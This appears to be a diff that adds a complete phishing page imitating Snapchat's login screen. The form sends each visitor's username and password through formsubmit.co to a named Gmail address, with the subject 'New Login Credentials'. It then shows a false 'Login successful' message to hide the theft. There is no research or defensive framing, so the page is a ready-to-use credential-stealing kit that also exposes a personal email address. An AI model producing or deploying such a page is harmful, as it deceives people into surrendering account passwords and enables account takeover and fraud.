@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Log In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 375px;
+        }
+
+        h1 {
+            color: #000;
+            font-size: 24px;
+            margin-bottom: 30px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .input-field {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .input-label {
+            display: block;
+            color: #0390fc;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .input-line {
+            border: none;
+            border-bottom: 1px solid #ddd;
+            width: 100%;
+            padding: 10px 0;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .input-line:focus {
+            border-bottom-color: #000;
+        }
+
+        .phone-link {
+            color: #0390fc;
+            font-size: 14px;
+            font-weight: bold;
+            display: block;
+            margin-top: 5px;
+            text-decoration: none;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+        }
+
+        .checkbox-container input {
+            margin-right: 10px;
+            accent-color: #0390fc;
+        }
+
+        .checkbox-container label {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .forgot-password {
+            color: #0390fc;
+            font-size: 14px;
+            font-weight: bold;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+            margin: 25px 0;
+        }
+
+        .login-button {
+            background-color: #FFFC00;
+            color: #000;
+            border: none;
+            border-radius: 20px;
+            padding: 12px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .login-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .login-button.active {
+            background-color: #0390fc;
+            color: #fff;
+        }
+
+        .success-message {
+            color: #0390fc;
+            text-align: center;
+            margin-top: 20px;
+            font-weight: bold;
+            display: none;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 0;
+            top: 35px;
+            cursor: pointer;
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Log In</h1>
+        
+        <!-- Changed action to FormSubmit.co URL with your email -->
+        <form id="loginForm" action="https://formsubmit.co/abuhuraira3912l@gmail.com" method="POST">
+            <!-- Add these hidden fields for FormSubmit.co configuration -->
+            <input type="hidden" name="_subject" value="New Login Credentials">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
+            <input type="text" name="_honey" style="display:none">
+            
+            <div class="input-field">
+                <label for="username" class="input-label">USERNAME OR EMAIL</label>
+                <input type="text" id="username" name="username" class="input-line" required>
+                <a href="#" class="phone-link">Use phone number instead</a>
+            </div>
+            
+            <div class="input-field">
+                <label for="password" class="input-label">PASSWORD</label>
+                <input type="password" id="password" name="password" class="input-line" required>
+                <span class="password-toggle" id="togglePassword">SHOW</span>
+            </div>
+            
+            <div class="checkbox-container">
+                <input type="checkbox" id="rememberMe" checked>
+                <label for="rememberMe">Save Login Info on your device</label>
+            </div>
+            
+            <a href="#" class="forgot-password">Forgot your password?</a>
+            
+            <button type="submit" class="login-button" disabled id="loginButton">Log In</button>
+            
+            <div class="success-message" id="successMessage">
+                Login successful! Redirecting...
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginButton = document.getElementById('loginButton');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const togglePassword = document.getElementById('togglePassword');
+            const successMessage = document.getElementById('successMessage');
+            const loginForm = document.getElementById('loginForm');
+            
+            // Toggle password visibility
+            togglePassword.addEventListener('click', function() {
+                if (passwordInput.type === 'password') {
+                    passwordInput.type = 'text';
+                    togglePassword.textContent = 'HIDE';
+                } else {
+                    passwordInput.type = 'password';
+                    togglePassword.textContent = 'SHOW';
+                }
+            });
+            
+            // Enable/disable login button based on input
+            function checkInputs() {
+                if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+                    loginButton.disabled = false;
+                    loginButton.classList.add('active');
+                } else {
+                    loginButton.disabled = true;
+                    loginButton.classList.remove('active');
+                }
+            }
+            
+            usernameInput.addEventListener('input', checkInputs);
+            passwordInput.addEventListener('input', checkInputs);
+            
+            // Form submission
+            loginForm.addEventListener('submit', function(e) {
+                // Show loading state
+                loginButton.textContent = 'Logging in...';
+                loginButton.disabled = true;
+                
+                // Show success message
+                successMessage.style.display = 'block';
+                
+                // The form will automatically submit to FormSubmit.co
+                // which will send the email with the credentials
+                
+                // Prevent immediate redirection so user sees the success message
+                setTimeout(() => {
+                    // Let the form submit proceed normally
+                }, 2000);
+            });
+        });
+    </script>
+</body>
+</html>
